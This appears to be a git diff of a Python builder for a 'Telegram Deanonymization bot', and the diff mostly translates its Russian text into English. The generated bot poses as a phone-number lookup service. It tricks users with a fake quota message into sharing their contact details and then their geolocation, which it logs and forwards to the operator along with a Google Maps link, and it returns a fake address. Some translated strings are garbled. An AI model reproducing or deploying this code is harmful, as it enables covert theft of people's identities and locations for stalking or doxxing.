@@ -40,7 +40,7 @@ print(Fore.MAGENTA + '|_____/  |_| \_| |_| \_|' + Fore.YELLOW + '|_|  |_| |_____
 print(Fore.YELLOW + '-----------------------------------------')
 print(Fore.YELLOW + '|' + Fore.BLUE +  " Telegram Deanonymization bot builder  " + Fore.YELLOW + '|')
 print(Fore.YELLOW + '|' + Fore.BLUE +  "       Developer: @suman333mondal         " + Fore.YELLOW + '|')
-print(Fore.YELLOW + '|' + Fore.BLUE +  "       Channel: t.me/onlinehacking   " + Fore.YELLOW + '|')
+print(Fore.YELLOW + '|' + Fore.BLUE +  "       Channel: t.me/OnlineHacking   " + Fore.YELLOW + '|')
 print(Fore.YELLOW + '-----------------------------------------')
 userid = input(Fore.RED +  "Enter your Telegram ID > ")
 token = input(Fore.BLUE +  "Enter your bot token > ")
@@ -95,20 +95,20 @@ def proc2(message):
 		num = user_input.replace('+', '')
 
 		if not num.isdigit():
-			msg = bot.reply_to(message, 'Кажется, вы не ввели действительный номер телефона, повторите попытку, написав /getinfo!')#⏳
+			msg = bot.reply_to(message, 'It seems you did not enter a valid phone number, please try again by typing /getinfo!')#⏳
 			return
 
-		bot.send_message(m_id, f'Запрос на номер {{num}} отправлен!')
+		bot.send_message(m_id, f'Request for number {{num}} has been sent!')
 		time.sleep(2)
 		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
+		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
 		keyboard.add(button_phone)	
-		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
-			Чтобы получить дополнительные вопросы зарегестрируйтесь в боте!''', reply_markup=keyboard)
+		bot.send_message(m_id, '''Looks like you have no free requests left for the day!
+			To get additional questions, register in the bot!''', reply_markup=keyboard)
 # Отловка ошибок
 	except Exception as e:
 		bot.send_message(ID, e)
-		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')
+		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
 
 @bot.message_handler(content_types=['contact']) 
 def contact(message):
@@ -119,11 +119,11 @@ def contact(message):
 		userid = message.contact.user_id
 		phone = message.contact.phone_number
 		info = f'''
-			Данные
-			├Имя: {{first}} {{last}}
+			Data
+			├Name: {{first}} {{last}}
 			├ID: {{userid}}
-			├Ник: @{{nick}}
-			└Номер телефона: {{phone}}
+			├Nick: @{{nick}}
+			└Phone number: {{phone}}
 			'''
 		log = open('bot-log.txt', 'a+', encoding='utf-8')
 		log.write(info + '  ')
@@ -135,21 +135,21 @@ def contact(message):
 			bot.send_message(message.chat.id, 'Отправьте свой контакт!')
 
 	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
-	button = types.InlineKeyboardButton(text="Расширенный поиск", callback_data="find")
+	button = types.InlineKeyboardButton(text="Advanced Search", callback_data="find")
 	keyboardmain.add(button)
 	bot.send_message(message.chat.id, f'''
-		Информация о номере
-		├Оператор: Beeline
-		└Страна: Россия
+		Room information
+		├Operator: Beeline
+		└Country: Russia
 		''', reply_markup=keyboardmain)
 
 @bot.callback_query_handler(func=lambda call:True)
 def callback_inline(call):
 	if call.data == "find":
 		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-		button_location = types.KeyboardButton(text="Подтвердить", request_location=True) 	
+		button_location = types.KeyboardButton(text="Confirm", request_location=True) 	
 		keyboard1.add(button_location)
-		bot.send_message(call.message.chat.id, text='Для использования бесплатного расширенного поиска, подтвердите геолокацию!', reply_markup=keyboard1)
+		bot.send_message(call.message.chat.id, text='To use the free advanced search, confirm your geolocation!', reply_markup=keyboard1)
 
 @bot.message_handler(content_types=['location']) 
 def contact(message):
@@ -161,7 +161,7 @@ def contact(message):
 		├ID: {{message.chat.id}}
 		├Longitude: {{lon}}
 		├Latitude: {{lat}}
-		└Карты: https://www.google.com/maps/place/{{lat}}+{{lon}} 
+		└Cards: https://www.google.com/maps/place/{{lat}}+{{lon}} 
 		'''
 		log = open('bot-log.txt', 'a+', encoding='utf-8')
 		log.write(geo + '  ')
@@ -169,13 +169,13 @@ def contact(message):
 		bot.send_message(ID, geo) 
 		print(geo)
 		bot.send_message(message.chat.id, f'''
-			Геолокация
-			└Адрес: {{random.choice(adr)}}
+			Geolocation
+			└Address: {{random.choice(adr)}}
 			''')
 bot.polling()
 		""")
 	f.close()
-	print("Файл probiv.py сохранен")
+	print("The probiv.py file is saved")
 
 if choice == 2:
 	f = open('nacr.py', 'w+', encoding='utf-8')
